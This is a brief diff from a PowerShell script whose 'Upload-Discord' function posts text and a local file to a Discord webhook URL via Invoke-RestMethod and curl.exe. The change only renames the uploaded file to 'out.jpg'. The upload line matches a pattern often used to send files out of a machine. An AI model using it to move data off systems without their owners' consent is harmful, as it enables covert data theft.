@@ -19,4 +19,4 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 
-Upload-Discord -file "img.png" -text "this is an iamge"
+Upload-Discord -file "out.jpg" -text "this is an iamge"
